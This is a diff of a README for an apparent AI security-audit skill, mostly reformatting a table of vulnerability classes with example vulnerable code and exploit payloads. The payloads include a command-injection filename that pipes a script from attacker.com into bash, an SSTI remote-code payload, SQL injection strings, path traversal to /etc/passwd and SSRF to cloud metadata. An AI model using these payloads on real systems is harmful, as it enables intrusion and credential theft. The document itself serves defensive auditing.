@@ -44,35 +44,37 @@ No configuration. No setup beyond `./install.sh`. It asks two questions — bran
 
 22 vulnerability categories, including everything in OWASP Top 10 2025:
 
-| Category | What it actually flags |
-|---|---|
-| SQL / NoSQL Injection | `cursor.execute(f"SELECT * FROM users WHERE name='{name}'"` — auth bypass with `' OR 1=1 --`, full DB dump via `UNION SELECT` |
-| OS Command Injection | `subprocess.run(f"convert {filename}", shell=True)` — RCE via filename `; curl attacker.com/shell.sh \| bash` |
-| Path Traversal | `open(uploads_dir + request.args['file'])` with no canonicalization — reads `/etc/passwd` via `../../etc/passwd` |
-| Broken Access Control | `/api/orders/{id}` checks `session['logged_in']` but never asserts `order.owner == session['user_id']` — any user reads any order |
-| Cryptographic Failures | `hashlib.md5(password.encode()).hexdigest()` — entire user table crackable with rainbow tables in minutes |
-| Hardcoded Credentials | `AWS_SECRET_KEY = "wJalrXUt..."` in `config/settings.py` — anyone with repo read access owns the AWS account |
-| SSRF | `requests.get(request.form['webhook_url'])` with no allowlist — pivots to `169.254.169.254/latest/meta-data/` for cloud credential theft |
-| XSS / SSTI | `render_template_string(user_bio)` — `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` escalates to RCE |
-| Insecure Deserialization | `pickle.loads(base64.b64decode(session_cookie))` — crafted payload executes arbitrary code on deserialization |
-| Auth Bypass | JWT library initialized with `algorithms=["none", "HS256"]` — attacker signs tokens without the secret key |
-| Mass Assignment | `User(**request.json)` with no field allowlist — adding `"role": "admin"` to the registration body grants admin rights |
-| Security Misconfiguration | `app.run(debug=True)` in production exposes the Werkzeug interactive debugger — unauthenticated RCE via any 500 error |
-| Dependency Vulnerabilities | `PyYAML==3.13` in `requirements.txt` (CVE-2017-18342) — `yaml.load()` calls anywhere in the codebase execute arbitrary Python |
-| Secrets in Logs | `logger.debug(f"Authenticating user {username} with password {password}")` — credentials land in log aggregators and rotation archives |
-| Cloud Misconfigurations | EC2 instance profile with `"Action": "*", "Resource": "*"` — SSRF to metadata service yields keys that own the entire AWS account |
-| ... and 7 more | Clickjacking, CSRF, insecure file upload, XXE, race conditions in payment flows, open redirect, missing rate limiting |
+| Category                   | What it actually flags                                                                                                                   |
+| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
+| SQL / NoSQL Injection      | `cursor.execute(f"SELECT * FROM users WHERE name='{name}'"` — auth bypass with `' OR 1=1 --`, full DB dump via `UNION SELECT`            |
+| OS Command Injection       | `subprocess.run(f"convert {filename}", shell=True)` — RCE via filename `; curl attacker.com/shell.sh \| bash`                            |
+| Path Traversal             | `open(uploads_dir + request.args['file'])` with no canonicalization — reads `/etc/passwd` via `../../etc/passwd`                         |
+| Broken Access Control      | `/api/orders/{id}` checks `session['logged_in']` but never asserts `order.owner == session['user_id']` — any user reads any order        |
+| Cryptographic Failures     | `hashlib.md5(password.encode()).hexdigest()` — entire user table crackable with rainbow tables in minutes                                |
+| Hardcoded Credentials      | `AWS_SECRET_KEY = "wJalrXUt..."` in `config/settings.py` — anyone with repo read access owns the AWS account                             |
+| SSRF                       | `requests.get(request.form['webhook_url'])` with no allowlist — pivots to `169.254.169.254/latest/meta-data/` for cloud credential theft |
+| XSS / SSTI                 | `render_template_string(user_bio)` — `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` escalates to RCE               |
+| Insecure Deserialization   | `pickle.loads(base64.b64decode(session_cookie))` — crafted payload executes arbitrary code on deserialization                            |
+| Auth Bypass                | JWT library initialized with `algorithms=["none", "HS256"]` — attacker signs tokens without the secret key                               |
+| Mass Assignment            | `User(**request.json)` with no field allowlist — adding `"role": "admin"` to the registration body grants admin rights                   |
+| Security Misconfiguration  | `app.run(debug=True)` in production exposes the Werkzeug interactive debugger — unauthenticated RCE via any 500 error                    |
+| Dependency Vulnerabilities | `PyYAML==3.13` in `requirements.txt` (CVE-2017-18342) — `yaml.load()` calls anywhere in the codebase execute arbitrary Python            |
+| Secrets in Logs            | `logger.debug(f"Authenticating user {username} with password {password}")` — credentials land in log aggregators and rotation archives   |
+| Cloud Misconfigurations    | EC2 instance profile with `"Action": "*", "Resource": "*"` — SSRF to metadata service yields keys that own the entire AWS account        |
+| ... and 7 more             | Clickjacking, CSRF, insecure file upload, XXE, race conditions in payment flows, open redirect, missing rate limiting                    |
 
 ---
 
 ## Real finding — from the included eval app
 
-Here is an actual finding the skill produced on `vulnapp`, a deliberately vulnerable Flask app included in this repo. The finding is as-generated — no editing:
+Here is an actual finding the skill produced on `vulnapp`, a deliberately vulnerable Flask app included in this repo:
 
 **VUL-001 · CRITICAL · SQL Injection — `/login` endpoint**
+
 > `src/app.py:35` — Username and password interpolated directly into a raw SQL query via Python f-string. No parameterization, no escaping. Authentication can be bypassed with `' OR '1'='1` and the entire database dumped with a single `UNION SELECT`.
 
 **Vulnerable code** (`src/app.py:35`):
+
 ```python
 # Before — exploitable
 query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
@@ -80,6 +82,7 @@ cursor.execute(query)
 ```
 
 **Fixed code** (from the generated developer guide):
+
 ```python
 # After — parameterized query
 query = "SELECT * FROM users WHERE username = ? AND password = ?"
@@ -139,14 +142,14 @@ The skill found **24 findings** in vulnapp: **5 Critical · 13 High · 5 Medium 
 
 ### Vulnerability Report PDF
 
-Dark navy professional layout — not a linter dump. Every finding is structured as:
+Each finding is structured as:
 
-| Field | Content |
-|---|---|
-| **Severity** | CVSS 3.1 score + vector string |
-| **Evidence** | Exact `file:line` reference with code excerpt |
-| **Remediation** | Concrete fix with the correct code pattern |
-| **Standards** | CWE · OWASP Top 10 · CVE references |
+| Field           | Content                                       |
+| --------------- | --------------------------------------------- |
+| **Severity**    | CVSS 3.1 score + vector string                |
+| **Evidence**    | Exact `file:line` reference with code excerpt |
+| **Remediation** | Concrete fix with the correct code pattern    |
+| **Standards**   | CWE · OWASP Top 10 · CVE references           |
 
 The report follows an industry-standard 8-section structure: Cover & Executive Summary → Scope & Methodology → Risk Dashboard → Threat Model → Detailed Findings → Attack Chain Analysis → Compliance Mapping (OWASP / ISO 27001 / NIST CSF / PCI DSS) → Security Strengths.
 
@@ -229,12 +232,12 @@ Produces one PDF per branch with findings diffed to surface vulnerabilities intr
 
 ## Dependencies
 
-| Dependency | Distribution | Phases |
-|---|---|---|
-| `audit-context-building` | Bundled in `deps/` | 2–3: architecture + function analysis |
-| `claude-scientific-writer` | Installed by `./install.sh` | 5 + 7: CVE research + dev guide |
-| Chrome / Chromium | System | 6–7: PDF rendering |
-| Python 3.8+ | System | 6–7: report generation |
+| Dependency                 | Distribution                | Phases                                |
+| -------------------------- | --------------------------- | ------------------------------------- |
+| `audit-context-building`   | Bundled in `deps/`          | 2–3: architecture + function analysis |
+| `claude-scientific-writer` | Installed by `./install.sh` | 5 + 7: CVE research + dev guide       |
+| Chrome / Chromium          | System                      | 6–7: PDF rendering                    |
+| Python 3.8+                | System                      | 6–7: report generation                |
 
 Both optional dependencies degrade gracefully — skip them and the core vulnerability report is still produced in full.
 
@@ -272,6 +275,7 @@ Found a bug, a missed vulnerability class, or a false positive pattern? Please o
 **[github.com/Yashvendra/claude-security-skills/issues](https://github.com/Yashvendra/claude-security-skills/issues)**
 
 Include:
+
 - A description of the problem and what you expected
 - The language / framework of the audited codebase (no source code needed)
 - The phase where it failed (e.g., PDF generation, CVE enrichment)
